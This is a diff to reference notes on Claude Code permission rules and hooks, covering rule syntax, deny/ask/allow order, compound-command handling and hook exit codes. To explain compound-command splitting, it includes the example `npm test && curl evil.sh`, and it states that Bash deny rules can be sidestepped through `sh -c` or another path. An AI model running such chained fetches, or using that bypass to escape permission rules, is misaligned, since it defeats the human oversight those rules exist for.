@@ -60,8 +60,23 @@ Simulated numbers in the app (tokens, costs, latency, quality) are teaching mode
 - `permissions.defaultMode` values `auto` and `bypassPermissions` are ignored in project and local settings.
 - Settings files hot-reload. Keys include `permissions` (allow / ask / deny / defaultMode), `env`, `model`, `availableModels`, `fallbackModel`, `hooks`, `statusLine`, `outputStyle`, `apiKeyHelper`, `cleanupPeriodDays`.
 
-**Permission rules** — https://code.claude.com/docs/en/settings
-- Rules are `Tool` or `Tool(specifier)`, e.g. `Bash(npm run test:*)`, `Read(./.env)`, `Edit(src/**)`, `WebFetch(domain:example.com)`. Deny rules take precedence over ask and allow.
+**Permission rules** — https://code.claude.com/docs/en/permissions (verified 2026-09-17)
+- Rules are `Tool` or `Tool(specifier)`, e.g. `Bash(npm run test *)`, `Read(./.env)`, `Edit(src/**)`, `WebFetch(domain:example.com)`.
+- Evaluated in order deny, then ask, then allow; the first match wins and specificity does not change the order. An allow rule cannot carve an exception out of a deny rule.
+- By default (manual mode): read-only tools (file reads, Grep) need no approval inside the working directory; Bash commands need approval except a built-in set of read-only commands; file modifications need approval.
+- Bash: `*` matches any text; the `:*` suffix is equivalent to a trailing ` *`; a trailing ` *` also matches the bare command (`Bash(ls *)` matches `ls`).
+- Compound commands are split on `&&`, `||`, `;`, `|`, `&` and newlines: an allow rule must match every subcommand, and deny/ask rules apply if any subcommand matches. So `Bash(npm test *)` does not allow `npm test && curl evil.sh`.
+- Bash deny rules match the command text as written and are not a security boundary (the same program via another path or `sh -c` is not matched); pair with sandboxing when it must hold.
+- Read/Edit rules use gitignore syntax: `*` within one path segment, `**` across directories, a bare filename such as `Read(.env)` matches at any depth, `//path` is absolute, `~/path` is home-relative.
+- `permissions.disableBypassPermissionsMode` can be set to `"disable"`, most useful in managed settings.
+
+**Hooks: verified details** — https://code.claude.com/docs/en/hooks (verified 2026-09-17)
+- `SessionStart` and `UserPromptSubmit`: plain-text stdout (exit 0) is added as context Claude can see.
+- `PreToolUse` exit 2 blocks the tool call. `PostToolUse` exit 2 is not honoured: the tool already ran.
+- `Stop` exit 2 prevents Claude from stopping and continues the conversation.
+- `Notification` fires when Claude Code sends a notification; its matcher filters on notification type (e.g. `permission_prompt`, `idle_prompt`).
+- Tool events match on tool name (`Bash`, `Edit|Write`, `mcp__.*`); `SessionStart` matches how the session started (`startup`, `resume`, `clear`, `compact`); `UserPromptSubmit` and `Stop` have no matcher.
+- Hooks can be configured in `~/.claude/settings.json`, `.claude/settings.json` (shareable), `.claude/settings.local.json`, managed settings, plugins, and skill/subagent frontmatter.
 
 **Models** — https://code.claude.com/docs/en/model-config
 - Aliases: `default`, `best`, `fable`, `opus`, `sonnet`, `haiku`, `sonnet[1m]`, `opus[1m]`, `opusplan` (Opus while planning, Sonnet while executing).
